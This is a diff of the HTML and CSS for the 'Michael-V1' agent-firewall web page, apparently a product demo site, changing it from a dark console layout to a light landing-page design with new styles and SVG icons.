@@ -3,325 +3,334 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Michael-V1 Console</title>
+<title>Michael-V1 · Agent Firewall</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #0a0c10; --panel: #0f131a; --panel2: #141a23; --line: #1f2733; --line2: #2a3442;
-    --text: #e6ebf2; --muted: #8b95a7; --faint: #5b6576;
-    --accent: #22d3ee; --accent-bg: rgba(34,211,238,.10);
-    --ok: #34d399; --ok-bg: rgba(52,211,153,.10);
-    --bad: #f43f5e; --bad-bg: rgba(244,63,94,.10);
-    --warn: #f59e0b; --warn-bg: rgba(245,158,11,.10);
-    --ai: #64748b;
-    --sans: Inter, "Segoe UI", system-ui, sans-serif;
-    --mono: "JetBrains Mono", "Cascadia Code", Consolas, monospace;
+    --bg: #f6f7fb; --card: #ffffff; --ink: #0f172a; --ink2: #334155; --muted: #64748b; --faint: #94a3b8;
+    --line: #e5e8f0; --soft: #f1f4f9;
+    --brand: #4f46e5; --brand2: #06b6d4; --grad: linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
+    --ok: #059669; --ok-bg: #ecfdf5; --bad: #e11d48; --bad-bg: #fff1f2; --warn: #d97706; --warn-bg: #fffbeb;
+    --shadow: 0 1px 2px rgba(15,23,42,.04), 0 8px 24px rgba(15,23,42,.06);
+    --sans: Inter, "Segoe UI", system-ui, sans-serif; --mono: "JetBrains Mono", Consolas, monospace;
   }
   * { box-sizing: border-box; }
-  html, body { margin: 0; background: var(--bg); color: var(--text); font: 14px/1.55 var(--sans); }
-  button { font: inherit; color: inherit; }
-  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
-  .mono { font-family: var(--mono); }
-  .muted { color: var(--muted); }
+  html { scroll-behavior: smooth; }
+  body { margin: 0; background: var(--bg); color: var(--ink); font: 15px/1.6 var(--sans); }
+  button { font: inherit; color: inherit; cursor: pointer; }
+  a { color: var(--brand); }
+  :focus-visible { outline: 3px solid rgba(79,70,229,.35); outline-offset: 2px; }
+  .wrap { max-width: 1180px; margin: 0 auto; padding: 0 24px; }
   .hidden { display: none !important; }
-  svg.i { width: 16px; height: 16px; fill: none; stroke: currentColor; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; flex: none; }
+  .mono { font-family: var(--mono); }
+  svg.i { width: 18px; height: 18px; fill: none; stroke: currentColor; stroke-width: 1.9; stroke-linecap: round; stroke-linejoin: round; flex: none; }
 
-  .app { display: grid; grid-template-columns: 232px 1fr; min-height: 100vh; }
-  aside.nav { border-right: 1px solid var(--line); padding: 18px 12px; position: sticky; top: 0; height: 100vh; display: flex; flex-direction: column; gap: 4px; background: var(--panel); }
-  .brand { display: flex; gap: 10px; align-items: center; padding: 4px 8px 18px; }
-  .brand .logo { width: 30px; height: 30px; border-radius: 8px; background: linear-gradient(135deg, #22d3ee, #6366f1); display: grid; place-items: center; }
-  .brand .logo svg { width: 16px; height: 16px; stroke: #0a0c10; stroke-width: 2.4; fill: none; }
-  .brand b { display: block; font-size: 15px; letter-spacing: .01em; }
-  .brand span { display: block; font: 11px var(--mono); color: var(--faint); }
-  .nav a { display: flex; gap: 10px; align-items: center; padding: 8px 10px; border-radius: 8px; color: var(--muted); text-decoration: none; font-weight: 500; }
-  .nav a:hover { background: var(--panel2); color: var(--text); }
-  .nav a.on { background: var(--panel2); color: var(--text); box-shadow: inset 2px 0 0 var(--accent); }
-  .sys { margin-top: auto; border-top: 1px solid var(--line); padding: 12px 8px 0; display: grid; gap: 6px; font: 11.5px var(--mono); color: var(--muted); }
-  .sys .row { display: flex; justify-content: space-between; gap: 8px; }
-  .dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; margin-right: 6px; vertical-align: 1px; }
+  header { position: sticky; top: 0; z-index: 30; background: rgba(246,247,251,.85); backdrop-filter: blur(10px); border-bottom: 1px solid var(--line); }
+  header .wrap { display: flex; align-items: center; gap: 18px; height: 64px; }
+  .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; color: var(--ink); font-weight: 800; font-size: 18px; letter-spacing: -.02em; white-space: nowrap; }
+  .logo span.mark { width: 32px; height: 32px; border-radius: 10px; background: var(--grad); display: grid; place-items: center; box-shadow: 0 6px 16px rgba(79,70,229,.3); }
+  .logo span.mark svg { width: 17px; height: 17px; stroke: #fff; stroke-width: 2.4; fill: none; }
+  nav { display: flex; gap: 2px; margin-left: auto; overflow-x: auto; }
+  nav a { text-decoration: none; color: var(--ink2); font-weight: 500; font-size: 14px; padding: 8px 12px; border-radius: 10px; white-space: nowrap; }
+  nav a:hover { background: var(--card); }
+  nav a.on { color: var(--brand); background: var(--card); box-shadow: var(--shadow); }
 
-  main { padding: 26px 32px 60px; min-width: 0; }
-  .pagehead { display: flex; align-items: flex-end; justify-content: space-between; gap: 16px; margin-bottom: 18px; flex-wrap: wrap; }
-  .pagehead h1 { margin: 0; font-size: 22px; font-weight: 600; letter-spacing: -.01em; }
-  .pagehead p { margin: 4px 0 0; color: var(--muted); max-width: 760px; }
-  .crumb { font: 11px var(--mono); color: var(--faint); text-transform: uppercase; letter-spacing: .12em; }
+  .card { background: var(--card); border: 1px solid var(--line); border-radius: 18px; box-shadow: var(--shadow); }
+  .pad { padding: 22px; }
+  .eyebrow { font: 600 12px var(--sans); color: var(--brand); text-transform: uppercase; letter-spacing: .12em; }
+  h1, h2, h3 { letter-spacing: -.02em; margin: 0; }
+  .sec { padding: 56px 0 8px; }
+  .sec h2 { font-size: 30px; font-weight: 800; margin-top: 6px; }
+  .sec .lead { color: var(--muted); font-size: 16px; margin: 8px 0 24px; max-width: 720px; }
+  .grad-text { background: var(--grad); -webkit-background-clip: text; background-clip: text; color: transparent; }
+  .btn { display: inline-flex; align-items: center; gap: 8px; border: 1px solid var(--line); background: var(--card); padding: 11px 18px; border-radius: 12px; font-weight: 600; text-decoration: none; color: var(--ink); box-shadow: var(--shadow); }
+  .btn.primary { background: var(--grad); color: #fff; border: 0; box-shadow: 0 8px 22px rgba(79,70,229,.32); }
+  .btn:disabled { opacity: .55; cursor: wait; }
+  .pill { display: inline-flex; align-items: center; gap: 6px; font: 600 12px var(--sans); padding: 4px 10px; border-radius: 999px; background: var(--soft); color: var(--ink2); white-space: nowrap; }
+  .pill svg.i { width: 14px; height: 14px; }
+  .pill.ok { background: var(--ok-bg); color: var(--ok); } .pill.bad { background: var(--bad-bg); color: var(--bad); } .pill.warn { background: var(--warn-bg); color: var(--warn); }
+  .pill.brand { background: #eef2ff; color: var(--brand); }
 
-  .panel { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; }
-  .ph { display: flex; justify-content: space-between; align-items: center; gap: 10px; padding: 12px 16px; border-bottom: 1px solid var(--line); }
-  .ph h3 { margin: 0; font-size: 13px; font-weight: 600; }
-  .ph .sub { font: 11.5px var(--mono); color: var(--faint); }
-  .pb { padding: 16px; }
-  .grid { display: grid; gap: 14px; }
-  .g2 { grid-template-columns: 1fr 1fr; } .g3 { grid-template-columns: repeat(3, 1fr); } .g4 { grid-template-columns: repeat(4, 1fr); } .g5 { grid-template-columns: repeat(5, 1fr); }
-  .g2 > *, .g3 > *, .g4 > *, .g5 > * { min-width: 0; }
+  .hero { display: grid; grid-template-columns: 1.05fr .95fr; gap: 40px; align-items: center; padding: 64px 0 24px; }
+  .hero h1 { font-size: clamp(36px, 5vw, 58px); line-height: 1.05; font-weight: 800; letter-spacing: -.035em; margin: 14px 0 18px; }
+  .hero p { font-size: 18px; color: var(--ink2); margin: 0 0 28px; max-width: 560px; }
+  .hero .ctas { display: flex; gap: 12px; flex-wrap: wrap; }
+  .heroviz { padding: 18px; }
+  .heroviz svg { width: 100%; height: auto; display: block; }
+  @keyframes travel { 0% { offset-distance: 0%; opacity: 0; } 8% { opacity: 1; } 62% { offset-distance: 100%; opacity: 1; } 70%, 100% { offset-distance: 100%; opacity: 0; } }
+  @keyframes pulse { 0%, 55% { transform: scale(1); } 64% { transform: scale(1.14); } 74%, 100% { transform: scale(1); } }
+  @keyframes stamp { 0%, 62% { opacity: 0; transform: rotate(-10deg) scale(1.6); } 70%, 96% { opacity: 1; transform: rotate(-10deg) scale(1); } 100% { opacity: 0; } }
+  .packet { offset-path: path("M204 80 C 240 80, 250 150, 270 150 L 400 150"); animation: travel 4s ease-in-out infinite; }
+  .shieldpulse { transform-box: fill-box; transform-origin: center; animation: pulse 4s ease-in-out infinite; }
+  .stampanim { transform-box: fill-box; transform-origin: center; animation: stamp 4s ease-in-out infinite; }
+  .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 14px; margin-top: 30px; }
+  .stat { padding: 18px 20px; }
+  .stat .v { font-size: 30px; font-weight: 800; letter-spacing: -.03em; }
+  .stat .l { color: var(--muted); font-size: 13px; }
+  .models { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 16px; }
+  .models .pill { background: var(--card); border: 1px solid var(--line); padding: 8px 14px; font-size: 13.5px; }
+  .steps3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  .step .n { width: 34px; height: 34px; border-radius: 10px; background: #eef2ff; color: var(--brand); font-weight: 800; display: grid; place-items: center; }
+  .step h3 { font-size: 18px; margin: 14px 0 6px; }
+  .step p { color: var(--muted); margin: 0; font-size: 14.5px; }
+  .uses { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
+  .use .ic { width: 42px; height: 42px; border-radius: 12px; display: grid; place-items: center; background: var(--soft); color: var(--brand); }
+  .use h3 { font-size: 16px; margin: 14px 0 6px; }
+  .use p { color: var(--muted); font-size: 14px; margin: 0 0 12px; }
 
-  .kpi { padding: 14px 16px; }
-  .kpi .l { font: 11px var(--mono); color: var(--faint); text-transform: uppercase; letter-spacing: .1em; }
-  .kpi .v { font: 600 28px/1.15 var(--sans); margin-top: 6px; letter-spacing: -.02em; }
-  .kpi .v small { font-size: 14px; color: var(--muted); font-weight: 500; }
-  .kpi .d { color: var(--muted); font-size: 12.5px; margin-top: 2px; }
-  .up { color: var(--ok); } .down { color: var(--bad); } .acc { color: var(--accent); }
+  .pickers { display: grid; gap: 14px; margin-bottom: 20px; }
+  .chips { display: flex; gap: 8px; flex-wrap: wrap; }
+  .chip { border: 1px solid var(--line); background: var(--card); border-radius: 12px; padding: 9px 14px; font-weight: 600; font-size: 13.5px; color: var(--ink2); text-align: left; }
+  .chip.on { border-color: var(--brand); color: var(--brand); background: #eef2ff; }
+  .chip small { display: block; font-weight: 500; color: var(--muted); font-size: 11.5px; }
+  .label { font: 600 12px var(--sans); color: var(--muted); text-transform: uppercase; letter-spacing: .1em; margin-bottom: 8px; }
+  .duo { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .duo > * { min-width: 0; }
+  .phone { overflow: hidden; display: flex; flex-direction: column; }
+  .phone .top { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; gap: 10px; border-bottom: 1px solid var(--line); }
+  .phone .top b { font-size: 15px; }
+  .phone.off .top { background: linear-gradient(0deg, #fff, var(--bad-bg)); }
+  .phone.on .top { background: linear-gradient(0deg, #fff, #eef2ff); }
+  .verdict { padding: 14px 20px; font-weight: 600; font-size: 14.5px; border-bottom: 1px solid var(--line); }
+  .verdict.bad { color: var(--bad); background: var(--bad-bg); } .verdict.ok { color: var(--ok); background: var(--ok-bg); } .verdict.neutral { color: var(--ink2); background: var(--soft); }
+  .chat { padding: 18px; display: grid; gap: 12px; background: #fbfcfe; flex: 1; align-content: start; }
+  .msg { max-width: 88%; padding: 11px 15px; border-radius: 16px; font-size: 14px; word-break: break-word; white-space: pre-wrap; }
+  .msg.user { justify-self: end; background: var(--grad); color: #fff; border-bottom-right-radius: 4px; }
+  .msg.ai { justify-self: start; background: var(--card); border: 1px solid var(--line); border-bottom-left-radius: 4px; max-height: 210px; overflow: auto; }
+  .who { font: 600 11px var(--sans); color: var(--muted); text-transform: uppercase; letter-spacing: .08em; margin-bottom: 4px; }
+  .act { display: grid; grid-template-columns: 34px 1fr auto; gap: 12px; align-items: center; padding: 11px 14px; border-radius: 14px; background: var(--card); border: 1px solid var(--line); font-size: 13.5px; }
+  .act > div { min-width: 0; word-break: break-word; }
+  .act .ic { width: 34px; height: 34px; border-radius: 10px; display: grid; place-items: center; background: var(--soft); color: var(--ink2); }
+  .act.bad { border-color: #fecdd3; background: var(--bad-bg); } .act.bad .ic { background: #ffe4e6; color: var(--bad); }
+  .act.blocked { border-color: #c7d2fe; background: #eef2ff; } .act.blocked .ic { background: #e0e7ff; color: var(--brand); }
+  .act.ok .ic { background: var(--ok-bg); color: var(--ok); }
+  .act .why { display: block; color: var(--muted); font-size: 12.5px; margin-top: 2px; }
+  .note { justify-self: center; display: flex; gap: 8px; align-items: center; font-size: 12.5px; color: var(--brand); background: #eef2ff; border-radius: 999px; padding: 6px 12px; text-align: center; }
+  .note svg.i { width: 15px; height: 15px; }
+  .foot { padding: 12px 20px; border-top: 1px solid var(--line); font-size: 12.5px; color: var(--muted); display: flex; justify-content: space-between; gap: 10px; flex-wrap: wrap; }
+  .bar { height: 6px; border-radius: 3px; background: var(--soft); overflow: hidden; display: flex; width: 120px; align-self: center; }
+  .bar span { height: 100%; }
 
-  .tag { display: inline-flex; align-items: center; gap: 5px; font: 600 10.5px var(--mono); letter-spacing: .06em; padding: 2px 7px; border-radius: 5px; border: 1px solid var(--line2); color: var(--muted); white-space: nowrap; }
-  .tag.ok { color: var(--ok); border-color: rgba(52,211,153,.35); background: var(--ok-bg); }
-  .tag.bad { color: var(--bad); border-color: rgba(244,63,94,.35); background: var(--bad-bg); }
-  .tag.warn { color: var(--warn); border-color: rgba(245,158,11,.35); background: var(--warn-bg); }
-  .tag.acc { color: var(--accent); border-color: rgba(34,211,238,.35); background: var(--accent-bg); }
-
-  .pipe svg { width: 100%; height: auto; display: block; }
-  .flowline { stroke-dasharray: 5 7; animation: flow 1.2s linear infinite; }
-  @keyframes flow { to { stroke-dashoffset: -24; } }
-
-  .usecase h4 { margin: 10px 0 4px; font-size: 14px; }
-  .usecase p { margin: 0; color: var(--muted); font-size: 13px; }
-  .usecase .ico { width: 34px; height: 34px; border-radius: 9px; background: var(--panel2); border: 1px solid var(--line2); display: grid; place-items: center; color: var(--accent); }
-  .usecase .stop { margin-top: 10px; font: 12px var(--mono); color: var(--ok); }
-
-  .lab { display: grid; grid-template-columns: 300px 1fr; gap: 14px; align-items: start; }
-  .lab > * { min-width: 0; }
-  .cases { max-height: calc(100vh - 140px); overflow: auto; }
-  .cases .grp { font: 10.5px var(--mono); color: var(--faint); text-transform: uppercase; letter-spacing: .12em; padding: 12px 14px 6px; position: sticky; top: 0; background: var(--panel); }
-  .case { display: grid; grid-template-columns: 1fr auto; gap: 8px; align-items: center; width: 100%; text-align: left; border: 0; background: none; padding: 8px 14px; cursor: pointer; border-top: 1px solid var(--line); font-size: 13px; color: var(--muted); }
-  .case:hover { background: var(--panel2); color: var(--text); }
-  .case.on { background: var(--accent-bg); color: var(--text); box-shadow: inset 2px 0 0 var(--accent); }
-  .pair { display: flex; gap: 4px; }
-  .pair i { width: 8px; height: 8px; border-radius: 2px; display: block; background: var(--line2); }
-  .pair i.bad { background: var(--bad); } .pair i.ok { background: var(--ok); } .pair i.warn { background: var(--warn); }
-
-  .seg { display: inline-flex; background: var(--panel2); border: 1px solid var(--line2); border-radius: 8px; padding: 3px; }
-  .seg button { border: 0; background: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; color: var(--muted); font-weight: 500; font-size: 13px; }
-  .seg button.on { background: var(--bg); color: var(--text); box-shadow: 0 0 0 1px var(--line2); }
-  .seg button.on.off-mode { color: var(--bad); } .seg button.on.on-mode { color: var(--ok); }
-  .btn { border: 1px solid var(--line2); background: var(--panel2); color: var(--text); padding: 7px 12px; border-radius: 8px; cursor: pointer; font-weight: 500; display: inline-flex; gap: 6px; align-items: center; }
-  .btn:disabled { opacity: .5; cursor: wait; }
-  .prompt { font: 12.5px var(--mono); color: var(--muted); background: var(--bg); border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; word-break: break-word; }
-
-  .dmg { display: grid; grid-template-columns: repeat(4, 1fr); }
-  .dmg > div { padding: 12px 16px; border-right: 1px solid var(--line); min-width: 0; }
-  .dmg > div:last-child { border-right: 0; }
-  .dmg .l { font: 10.5px var(--mono); color: var(--faint); text-transform: uppercase; letter-spacing: .1em; }
-  .dmg .v { font: 600 20px var(--sans); margin-top: 4px; }
-  .dmg .s { font: 11.5px var(--mono); color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-
-  .wf { font: 11.5px var(--mono); }
-  .wf .axis, .wf .row { display: grid; grid-template-columns: 200px 1fr 70px; gap: 10px; align-items: center; }
-  .wf .row { height: 24px; border-top: 1px dashed var(--line); }
-  .wf .lab2 { color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-  .wf .track { position: relative; height: 100%; }
-  .wf .bar { position: absolute; top: 7px; height: 10px; border-radius: 2px; min-width: 2px; }
-  .wf .pt { position: absolute; top: 5px; width: 3px; height: 14px; border-radius: 1px; }
-  .wf .ms { text-align: right; color: var(--faint); }
-  .wf .axis { color: var(--faint); height: 18px; }
-  .wf .ticks { position: relative; height: 18px; }
-  .wf .ticks span { position: absolute; transform: translateX(-50%); white-space: nowrap; }
-  .wf .ticks span:first-child { transform: none; } .wf .ticks span:last-child { transform: translateX(-100%); }
-
-  .log { font: 12px var(--mono); max-height: 380px; overflow: auto; }
-  .log .r { display: grid; grid-template-columns: 70px 90px 1fr; gap: 10px; padding: 7px 16px; border-top: 1px solid var(--line); align-items: start; }
-  .log .r:first-child { border-top: 0; }
-  .log .who { color: var(--faint); }
-  .log .r.bad .who { color: var(--bad); } .log .r.shield .who { color: var(--accent); }
-  .log .r.bad { background: var(--bad-bg); } .log .r.shield { background: var(--accent-bg); }
-  .log .msg { word-break: break-word; color: var(--text); }
-  .answer { white-space: pre-wrap; font-size: 13px; color: var(--muted); max-height: 220px; overflow: auto; }
-
-  .chart svg { width: 100%; height: auto; display: block; }
+  .matrix { overflow-x: auto; }
   table { width: 100%; border-collapse: collapse; }
-  th, td { text-align: left; padding: 9px 12px; border-top: 1px solid var(--line); font-size: 13px; vertical-align: top; }
-  th { font: 10.5px var(--mono); color: var(--faint); text-transform: uppercase; letter-spacing: .1em; border-top: 0; }
-  td.num { font-family: var(--mono); text-align: right; } th.num { text-align: right; }
-  tr.me td { background: var(--accent-bg); }
+  th, td { text-align: left; padding: 14px 16px; border-top: 1px solid var(--line); vertical-align: top; font-size: 14px; }
+  th { font: 600 12px var(--sans); color: var(--muted); text-transform: uppercase; letter-spacing: .08em; border-top: 0; background: var(--soft); }
+  .cell { display: grid; gap: 6px; cursor: pointer; border-radius: 10px; padding: 6px; margin: -6px; justify-items: start; }
+  .cell:hover { background: var(--soft); }
+  .tabs { display: flex; gap: 6px; margin-bottom: 12px; flex-wrap: wrap; }
+  pre.code { margin: 0; background: #0f172a; color: #e2e8f0; border-radius: 14px; padding: 18px 20px; font: 13px/1.65 var(--mono); overflow-x: auto; }
+  pre.code .c { color: #94a3b8; } pre.code .k { color: #a5b4fc; } pre.code .s { color: #67e8f9; }
+
+  .score { display: grid; grid-template-columns: auto 1fr; gap: 26px; align-items: center; }
+  .score .big { font-size: 64px; font-weight: 800; letter-spacing: -.04em; line-height: 1; }
+  .score .big small { font-size: 20px; color: var(--muted); -webkit-text-fill-color: var(--muted); }
+  .chart svg { width: 100%; height: auto; display: block; }
+  .heat { display: inline-block; min-width: 56px; text-align: right; padding: 2px 8px; border-radius: 8px; font: 600 13px var(--mono); }
+  .g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
+  .g3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  .g2 > *, .g3 > * { min-width: 0; }
+  .small { font-size: 13px; color: var(--muted); }
   .tablewrap { overflow-x: auto; }
   .tablewrap table { min-width: 640px; }
-  .heat { display: inline-block; min-width: 54px; text-align: right; padding: 1px 6px; border-radius: 4px; }
-  .note { font-size: 12.5px; color: var(--muted); }
-  .note b { color: var(--text); font-weight: 500; }
-
-  .tl { position: relative; padding-left: 22px; }
-  .tl::before { content: ""; position: absolute; left: 6px; top: 6px; bottom: 6px; width: 1px; background: var(--line2); }
-  .tl .e { position: relative; margin-bottom: 18px; }
-  .tl .e::before { content: ""; position: absolute; left: -20px; top: 6px; width: 9px; height: 9px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 3px var(--panel); }
-  .tl h4 { margin: 0; font-size: 14px; }
-  .tl p { margin: 4px 0 0; color: var(--muted); font-size: 13px; }
-  .delta { font: 12px var(--mono); margin-top: 6px; display: flex; gap: 8px; flex-wrap: wrap; }
-  .delta .tag { white-space: normal; }
-  .hrow { display: grid; grid-template-columns: 180px minmax(0, 1fr) 190px; gap: 12px; align-items: center; margin-bottom: 10px; }
-  @media (max-width: 760px) { .hrow { grid-template-columns: minmax(0, 1fr); gap: 4px; margin-bottom: 14px; } .hrow > div:last-child { text-align: left !important; } }
-
-  .plain { display: flex; gap: 12px; align-items: flex-start; padding: 12px 16px; border: 1px solid rgba(34,211,238,.25); background: var(--accent-bg); border-radius: 10px; margin: 0 0 16px; font-size: 13.5px; color: var(--text); }
-  .plain b.k { font: 600 10.5px var(--mono); letter-spacing: .1em; color: var(--accent); text-transform: uppercase; white-space: nowrap; margin-top: 2px; }
-  .story { display: grid; grid-template-columns: repeat(3, 1fr); }
-  .story > div { padding: 18px 20px; border-right: 1px solid var(--line); min-width: 0; }
-  .story > div:last-child { border-right: 0; }
-  .story .n { font: 600 11px var(--mono); color: var(--faint); letter-spacing: .1em; }
-  .story h4 { margin: 6px 0 6px; font-size: 15px; }
-  .story p { margin: 0; color: var(--muted); font-size: 13.5px; }
-  .story .big { font: 600 26px var(--sans); margin-top: 10px; letter-spacing: -.02em; }
-  .gloss { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0; }
-  .gloss > div { padding: 14px 16px; border-top: 1px solid var(--line); border-right: 1px solid var(--line); min-width: 0; }
-  .gloss > div:nth-child(3n) { border-right: 0; }
-  .gloss b { display: block; font-size: 13.5px; margin-bottom: 3px; }
-  .gloss span { color: var(--muted); font-size: 13px; }
-  .what { padding: 14px 16px; border-top: 1px solid var(--line); font-size: 14px; }
-  .what b { font-weight: 600; }
-  .empty { padding: 28px 16px; text-align: center; color: var(--muted); font-size: 13px; }
-  .empty code { font: 12px var(--mono); color: var(--accent); background: var(--bg); padding: 2px 6px; border-radius: 4px; }
-  .verdict { padding: 16px 18px; display: grid; grid-template-columns: auto 1fr; gap: 18px; align-items: center; }
-  .verdict .score { font: 600 44px/1 var(--sans); color: var(--accent); letter-spacing: -.03em; }
-  .verdict .score small { font-size: 16px; color: var(--muted); }
-  .verdict p { margin: 0; font-size: 14px; color: var(--text); }
-  .verdict p + p { margin-top: 6px; color: var(--muted); font-size: 13px; }
-  .howto { font-size: 12px; color: var(--faint); margin-top: 10px; }
-  .kpi[title] { cursor: help; }
-  .spin { width: 12px; height: 12px; border: 2px solid var(--muted); border-top-color: transparent; border-radius: 50%; animation: sp .8s linear infinite; display: inline-block; }
+  footer { margin-top: 64px; border-top: 1px solid var(--line); padding: 28px 0 48px; color: var(--muted); font-size: 13px; }
+  .spin { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.6); border-top-color: transparent; border-radius: 50%; animation: sp .8s linear infinite; display: inline-block; }
   @keyframes sp { to { transform: rotate(360deg); } }
 
-  @media (max-width: 1100px) { .g5 { grid-template-columns: repeat(3, 1fr); } .g4 { grid-template-columns: 1fr 1fr; } .lab { grid-template-columns: 1fr; } .cases { max-height: 280px; } }
-  @media (max-width: 900px) { .story { grid-template-columns: 1fr; } .story > div { border-right: 0; border-bottom: 1px solid var(--line); } .gloss { grid-template-columns: 1fr 1fr; } .gloss > div:nth-child(3n) { border-right: 1px solid var(--line); } .gloss > div:nth-child(2n) { border-right: 0; } }
-  @media (max-width: 760px) {
-    .app { grid-template-columns: 1fr; }
-    aside.nav { position: static; height: auto; flex-direction: row; flex-wrap: wrap; padding: 10px; }
-    .brand { padding: 4px 8px; width: 100%; } .sys { display: none; }
-    .nav a { padding: 6px 8px; font-size: 13px; }
-    main { padding: 18px 16px 48px; }
-    .g2, .g3, .g4, .g5 { grid-template-columns: 1fr; }
-    .dmg { grid-template-columns: 1fr 1fr; } .dmg > div:nth-child(2) { border-right: 0; }
-    .wf .axis, .wf .row { grid-template-columns: 110px 1fr 54px; }
-    .log .r { grid-template-columns: 54px 1fr; } .log .r .msg { grid-column: 1 / -1; }
+  @media (max-width: 980px) {
+    .hero { grid-template-columns: 1fr; padding-top: 36px; }
+    .stats { grid-template-columns: repeat(3, 1fr); }
+    .uses { grid-template-columns: 1fr 1fr; }
+    .duo, .g2 { grid-template-columns: 1fr; }
   }
-  @media (prefers-reduced-motion: reduce) { .flowline { animation: none; } }
+  @media (max-width: 640px) {
+    .wrap { padding: 0 16px; }
+    header .wrap { gap: 10px; }
+    .logo { font-size: 16px; } .logo span.mark { width: 28px; height: 28px; }
+    nav a { padding: 7px 8px; font-size: 13px; }
+    .stats { grid-template-columns: 1fr 1fr; }
+    .steps3, .uses, .g3 { grid-template-columns: 1fr; }
+    .sec h2 { font-size: 24px; }
+    .score { grid-template-columns: 1fr; }
+  }
+  @media (prefers-reduced-motion: reduce) { .packet, .shieldpulse, .stampanim { animation: none; } }
 </style>
 </head>
 <body>
 <svg width="0" height="0" style="position:absolute" aria-hidden="true">
-  <symbol id="i-grid" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></symbol>
-  <symbol id="i-lab" viewBox="0 0 24 24"><path d="M9 3h6M10 3v6L4.5 18.5A2 2 0 0 0 6.2 21h11.6a2 2 0 0 0 1.7-2.5L14 9V3"/><path d="M7 15h10"/></symbol>
-  <symbol id="i-chart" viewBox="0 0 24 24"><path d="M3 3v18h18"/><path d="M7 16v-4M12 16V8M17 16v-7"/></symbol>
-  <symbol id="i-shield" viewBox="0 0 24 24"><path d="M12 3 4 6v6c0 5 3.5 8 8 9 4.5-1 8-4 8-9V6z"/><path d="m9 12 2 2 4-4"/></symbol>
-  <symbol id="i-log" viewBox="0 0 24 24"><path d="M12 8v4l3 2"/><circle cx="12" cy="12" r="9"/></symbol>
+  <defs><linearGradient id="g1" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#4f46e5"/><stop offset="1" stop-color="#06b6d4"/></linearGradient></defs>
+  <symbol id="i-shield" viewBox="0 0 24 24"><path d="M12 3 4 6v6c0 5 3.5 8 8 9 4.5-1 8-4 8-9V6z"/></symbol>
+  <symbol id="i-check" viewBox="0 0 24 24"><path d="M12 3 4 6v6c0 5 3.5 8 8 9 4.5-1 8-4 8-9V6z"/><path d="m9 12 2 2 4-4"/></symbol>
   <symbol id="i-mail" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></symbol>
   <symbol id="i-pay" viewBox="0 0 24 24"><rect x="2" y="6" width="20" height="13" rx="2"/><path d="M2 10h20M6 15h4"/></symbol>
+  <symbol id="i-file" viewBox="0 0 24 24"><path d="M14 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><path d="M14 3v6h6"/></symbol>
+  <symbol id="i-web" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></symbol>
+  <symbol id="i-send" viewBox="0 0 24 24"><path d="m22 2-7 20-4-9-9-4z"/><path d="M22 2 11 13"/></symbol>
+  <symbol id="i-block" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="m5.6 5.6 12.8 12.8"/></symbol>
   <symbol id="i-chat" viewBox="0 0 24 24"><path d="M21 12a8 8 0 0 1-11.6 7.1L3 21l1.9-6.4A8 8 0 1 1 21 12z"/></symbol>
   <symbol id="i-code" viewBox="0 0 24 24"><path d="m8 8-5 4 5 4M16 8l5 4-5 4M14 4l-4 16"/></symbol>
+  <symbol id="i-bolt" viewBox="0 0 24 24"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></symbol>
   <symbol id="i-play" viewBox="0 0 24 24"><path d="m7 4 13 8-13 8z"/></symbol>
+  <symbol id="i-eye" viewBox="0 0 24 24"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></symbol>
 </svg>
 
-<div class="app">
-  <aside class="nav">
-    <div class="brand"><div class="logo"><svg viewBox="0 0 24 24"><path d="M12 3 4 6v6c0 5 3.5 8 8 9 4.5-1 8-4 8-9V6z"/></svg></div>
-      <div><b>Michael-V1</b><span>runtime agent firewall</span></div></div>
-    <a href="#overview" data-p="overview"><svg class="i"><use href="#i-grid"/></svg>Overview</a>
-    <a href="#lab" data-p="lab"><svg class="i"><use href="#i-lab"/></svg>Attack Lab</a>
-    <a href="#benchmark" data-p="benchmark"><svg class="i"><use href="#i-chart"/></svg>Benchmark</a>
